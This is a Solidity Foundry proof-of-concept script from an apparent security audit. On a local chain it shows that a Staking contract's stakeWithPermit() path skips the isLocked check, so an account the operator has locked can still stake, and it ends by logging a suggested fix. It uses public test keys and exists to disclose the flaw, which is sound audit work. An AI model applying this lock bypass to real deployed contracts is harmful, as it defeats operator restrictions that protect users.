// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Staking}       from "../contracts/Staking/Staking.sol";
import {IStakingTypes} from "../contracts/Staking/IStakingTypes.sol";
import {ERC20Permit}   from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import {ERC20}         from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockTokenScript is ERC20Permit {
    constructor() ERC20("SpaceCoin", "SPC") ERC20Permit("SpaceCoin") {
        _mint(msg.sender, 10_000_000 ether);
    }
}

contract PocStakingIsLockedBypass is Script {
    uint256 constant OPERATOR_KEY = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 constant ALICE_KEY    = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;

    uint32 constant INTEREST_RATE  = 10_000;
    uint256 constant STAKE_AMOUNT  = 1_000 ether;

    bytes32 constant PERMIT_TYPEHASH =
        keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    function run() external {
        address operator = vm.addr(OPERATOR_KEY);
        address alice    = vm.addr(ALICE_KEY);

        // ── Deploy ────────────────────────────────────────────────────────────
        vm.startBroadcast(OPERATOR_KEY);
        MockTokenScript token   = new MockTokenScript();
        Staking         staking = new Staking(address(token), operator, INTEREST_RATE);
        token.transfer(alice, STAKE_AMOUNT * 2);
        vm.stopBroadcast();

        console.log("[deploy] Token:   ", address(token));
        console.log("[deploy] Staking: ", address(staking));
        console.log("[deploy] Alice:   ", alice);
        console.log("");

        // ── Operator locks Alice ──────────────────────────────────────────────
        vm.broadcast(OPERATOR_KEY);
        staking.lockOrUnlockAccount(alice, true);

        (,,,,, bool locked) = staking.stakeInfo(alice);
        console.log("[setup]  Operator locked Alice's account");
        console.log("[verify] Alice isLocked:", locked);
        console.log("");

        // ── stake() fails for locked Alice ────────────────────────────────────
        // (skip calling it in script to avoid revert; behaviour proven in forge test)
        console.log("=== CHAIN A: Normal stake() ===");
        console.log("[expected] stake() would revert with AccountIsLocked for locked Alice");
        console.log("");

        // ── stakeWithPermit() bypasses lock ───────────────────────────────────
        console.log("=== BYPASS: stakeWithPermit() ===");

        uint256 deadline = block.timestamp + 1 hours;
        uint256 nonce    = ERC20Permit(address(token)).nonces(alice);
        bytes32 structH  = keccak256(abi.encode(PERMIT_TYPEHASH, alice, address(staking), STAKE_AMOUNT, nonce, deadline));
        bytes32 digest   = keccak256(abi.encodePacked("\x19\x01", ERC20Permit(address(token)).DOMAIN_SEPARATOR(), structH));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ALICE_KEY, digest);

        vm.broadcast(ALICE_KEY);
        staking.stakeWithPermit(alice, STAKE_AMOUNT, STAKE_AMOUNT, deadline, v, r, s);

        (uint256 principal,) = staking.stakingReward(alice);
        (,,,,, bool stillLocked) = staking.stakeInfo(alice);

        require(stillLocked, "Alice should still be locked");
        require(principal == STAKE_AMOUNT, "Staked amount mismatch");

        console.log("[bypass] stakeWithPermit() SUCCEEDED for locked account");
        console.log("[bypass] Alice still locked:", stillLocked);
        console.log("[bypass] Alice staked principal:", principal / 1 ether, "tokens");
        console.log("");
        console.log("=== ATTACK CONFIRMED ===");
        console.log("stakeWithPermit() missing isLocked check.");
        console.log("Locked accounts bypass operator restrictions via permit path.");
        console.log("Fix: add  if (stakeInfo[owner].isLocked) revert AccountIsLocked();");
        console.log("     and  if (amountToStake == 0) revert InvalidStakingAmount();");
    }
}
